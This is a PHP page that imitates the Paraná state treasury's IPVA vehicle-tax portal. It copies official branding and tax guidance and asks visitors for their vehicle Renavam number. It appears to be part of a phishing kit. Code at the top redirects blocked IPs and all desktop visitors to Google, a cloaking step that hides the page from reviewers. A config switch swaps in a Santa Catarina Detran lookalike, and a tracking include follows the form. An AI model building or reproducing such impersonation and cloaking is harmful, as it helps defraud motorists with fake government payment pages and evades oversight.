<?php
/**
 * Portal IPVA Paraná - Página Principal (PHP)
 * Objetivo: ficar idêntico ao layout da versão Lovable.
 */
require_once __DIR__ . '/config.php';

// Verificar qual página index está configurada
try {
    $pdo = getConnection();
    $stmt = $pdo->prepare("SELECT valor FROM configuracoes WHERE chave = 'pagina_index'");
    $stmt->execute();
    $configPagina = $stmt->fetch();
    if ($configPagina && $configPagina['valor'] === 'detran_sc') {
        require_once __DIR__ . '/index-sc.php';
        exit;
    }
} catch (Exception $e) {}

// =============================================
// REGRAS DE ACESSO (público)
// - IP bloqueado -> Google
// - Desktop -> Google (site PHP é só celular)
// =============================================
enforceIpNotBlocked();
enforceMobileOnly();

header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: SAMEORIGIN');
header('X-XSS-Protection: 1; mode=block');
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>IPVA - Secretaria de Estado da Fazenda do Paraná</title>
  <meta name="description" content="Portal de consulta e pagamento do IPVA do Estado do Paraná. Consulte débitos e gere guias de pagamento.">

  <link rel="icon" href="assets/favicon.png" type="image/png">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">

  <link rel="stylesheet" href="assets/ipva-portal.css" />
  <link rel="stylesheet" href="assets/shared-buttons.css" />
</head>
<body>
  <div class="ipva-portal">
    <!-- Loading (mesma aparência do Lovable) -->
    <div class="ipva-loading-overlay" id="ipvaLoading" style="display:none">
      <div class="ipva-loading-modal">
        <p class="ipva-loading-text">Processando solicitação</p>
        <div class="ipva-spinner"></div>
      </div>
    </div>

    <header class="ipva-header">
      <div class="ipva-container">
        <div class="ipva-header-inner">
          <div class="ipva-brand">
            <img src="assets/logo-parana.png" alt="Estado do Paraná" />
            <div>
              <div class="ipva-brand-line1">Estado do Paraná</div>
              <div class="ipva-brand-line2">Secretaria de Estado da Fazenda</div>
            </div>
          </div>

          <div class="ipva-header-actions">
            <button class="sistema-btn" type="button">
              <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 16l-4-4m0 0l4-4m-4 4h14m-5 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h7a3 3 0 013 3v1" />
              </svg>
              Acessar o sistema
            </button>
          </div>
        </div>
      </div>
    </header>

    <main class="ipva-main">
      <section class="ipva-title-wrap">
        <div class="ipva-container">
          <h1 class="ipva-h1">IPVA - Imposto sobre a Propriedade de Veículos Automotores</h1>

          <div class="ipva-mascote">
            <img src="assets/assistente-virtual.png" alt="Assistente virtual" />
          </div>

          <hr class="ipva-divider" />

          <nav class="ipva-tabs" aria-label="Seções">
            <button type="button" class="ipva-tab active" data-scroll="consulta">Sobre o IPVA</button>
            <button type="button" class="ipva-tab" data-scroll="consulta"><span class="ipva-caret">›</span>Consultas</button>
            <button type="button" class="ipva-tab" data-scroll="consulta"><span class="ipva-caret">›</span>Serviços</button>
            <button type="button" class="ipva-tab" data-scroll="consulta">Legislação</button>
            <button type="button" class="ipva-tab" data-scroll="consulta">Ajuda</button>
          </nav>

          <div class="ipva-content-wrap">
            <div class="ipva-grid">
              <section class="ipva-content" aria-label="Conteúdo">
                <h2 class="ipva-h2">Sobre o IPVA</h2>

                <p class="ipva-p">
                  Trata-se de imposto estadual lançado anualmente, que destina 50% para o município de emplacamento do
                  veículo. Sua arrecadação é utilizada para custear os gastos públicos, como educação, saúde, segurança
                  e transporte.
                </p>

                <p class="ipva-p">
                  Se estiverem vencidos, os débitos do ano corrente devem ser quitados em uma única cota. Os débitos
                  vencidos de anos anteriores podem ser parcelados.
                </p>

                <h3 class="ipva-h3">Como pagar o IPVA:</h3>

                <ul class="ipva-list">
                  <li>
                    As guias para pagamento estão disponíveis em "<strong>Consultar Débitos e Guias para pagar o IPVA/PR</strong>",
                    acessado com o número do <strong>Renavam</strong>;
                  </li>
                  <li><strong>O IPVA pode ser pago por meio de:</strong></li>
                </ul>

                <ul class="ipva-list ipva-list-indent">
                  <li>
                    GR-PR (Guia de Recolhimento do Estado do Paraná) nos bancos credenciados (Banco do Brasil, Bradesco,
                    Bancoob, Rendimento, Santander, Itaú e Sicredi) para quaisquer exercícios pendentes de IPVA;
                  </li>
                  <li>
                    Apenas com o nº de Renavam do veículo, nas agências ou nos caixas automáticos dos bancos credenciados
                    (com exceção do Banco do Brasil).
                  </li>
                  <li>Pagamento via PIX, por meio de QR-CODE em GR-PR disponível no portal público.</li>
                  <li>
                    Consulta ao aplicativo Receita Paraná para pagamento via PIX, GR-PR e cartão de crédito - download do
                    aplicativo <a class="ipva-link" href="#">(IOS)</a> e <a class="ipva-link" href="#">(Android)</a>
                  </li>
                  <li>
                    Por meio de cartão de crédito para o exercício de 2024, em até 12 parcelas, por meio de empresas
                    terceirizadas <a class="ipva-link" href="#">(mais informações)</a>
                  </li>
                </ul>

                <ul class="ipva-list">
                  <li><strong>Observações:</strong></li>
                </ul>

                <ul class="ipva-list ipva-list-indent">
                  <li>
                    As dívidas ativas desvinculadas do veículo (oriundas de aquisições em leilão ou determinações judiciais)
                    podem ser quitadas com a emissão de guia para pagamento do IPVA;
                  </li>
                  <li>
                    Prazo de compensação: <span class="ipva-danger">até um dia útil após o pagamento.</span>
                  </li>
                </ul>

                <h3 class="ipva-h3">Como parcelar o IPVA:</h3>

                <ul class="ipva-list">
                  <li>
                    Consultar Débitos e Guias para pagar o IPVA/PR com o número do Renavam ou Acessar o Menu Serviços
                    Parcelamento de IPVA;
                  </li>
                  <li>É possível parcelar os débitos de IPVA de exercícios anteriores ao atual;</li>
                  <li>
                    O parcelamento pode chegar a até 10 parcelas, respeitado o valor mínimo de parcela de 1 UPF. Caso haja
                    ajuizamento ou protesto de dívidas ativas, será necessário procurar a PGE para pagamento de custas e
                    honorários;
                  </li>
                  <li>
                    O pagamento das parcelas deverá ser feito nos bancos credenciados, com emissão de cada parcela em seu
                    mês de referência;
                  </li>
                  <li>
                    Quem pode parcelar: proprietário, comprador do veículo registrado no Detran/PR ou arrendatário de
                    veículo.
                  </li>
                </ul>
              </section>

              <aside class="ipva-aside" aria-label="Consulta">
                <div class="ipva-card" id="consultaCard">
                  <h3 class="ipva-card-title">
                    Consultar Débitos e Guias para
                    <br />
                    pagar o IPVA/PR
                  </h3>

                  <label class="ipva-label" for="renavam">
                    <span class="ipva-required">*</span> <strong>Renavam</strong>
                  </label>

                  <form id="consultaForm" action="resultado.php" method="GET">
                    <input
                      id="renavam"
                      name="renavam"
                      class="ipva-input"
                      placeholder="Digite o Renavam"
                      maxlength="11"
                      inputmode="numeric"
                      autocomplete="off"
                      required
                    />

                    <div class="ipva-actions">
                      <button class="ipva-consultar-btn" type="submit">CONSULTAR</button>
                    </div>
                  </form>
                </div>
              </aside>
            </div>
          </div>
        </div>
      </section>
    </main>

    <footer class="ipva-footer">
      <div class="ipva-container">
        <p>© Secretaria da Fazenda - Portal SGT versão IP-01.011.49</p>
      </div>
    </footer>
  </div>

  <script>
    const input = document.getElementById('renavam');
    const form = document.getElementById('consultaForm');
    const loading = document.getElementById('ipvaLoading');
    const consultaCard = document.getElementById('consultaCard');

    // Scroll pro card de consulta ao clicar nas tabs
    document.querySelectorAll('[data-scroll="consulta"]').forEach((btn) => {
      btn.addEventListener('click', () => {
        consultaCard?.scrollIntoView({ behavior: 'smooth', block: 'center' });
      });
    });

    // Função para limpar RENAVAM - remove TUDO que não é número
    // (inclui espaços, tabs, quebras de linha, caracteres unicode invisíveis, etc)
    function limparRenavam(valor) {
      // Remove espaços, tabs, quebras de linha, non-breaking spaces, zero-width chars, etc
      return valor
        .replace(/[\s\u00A0\u200B\u200C\u200D\uFEFF\r\n\t]/g, '') // chars invisíveis
        .replace(/[^0-9]/g, ''); // só números
    }

    if (input) {
      // Limpa ao digitar
      input.addEventListener('input', function () {
        this.value = limparRenavam(this.value);
      });

      // Limpa ao colar (importante!)
      input.addEventListener('paste', function (e) {
        e.preventDefault();
        const texto = (e.clipboardData || window.clipboardData).getData('text');
        const limpo = limparRenavam(texto);
        
        // Insere o texto limpo
        const start = this.selectionStart;
        const end = this.selectionEnd;
        const antes = this.value.substring(0, start);
        const depois = this.value.substring(end);
        this.value = (antes + limpo + depois).substring(0, 11); // max 11 dígitos
        
        // Move cursor
        const novaPosicao = start + limpo.length;
        this.setSelectionRange(novaPosicao, novaPosicao);
      });

      // Limpa ao perder foco (garantia extra)
      input.addEventListener('blur', function () {
        this.value = limparRenavam(this.value);
      });
    }

    // Loading ao submeter
    if (form) {
      form.addEventListener('submit', function (e) {
        // Limpa o valor antes de enviar
        if (input) {
          input.value = limparRenavam(input.value);
          
          if (!input.value.trim()) {
            e.preventDefault();
            return;
          }
        }
        loading.style.display = 'flex';
      });
    }
  </script>

  <?php include __DIR__ . '/includes/tracking.php'; ?>
</body>
</html>
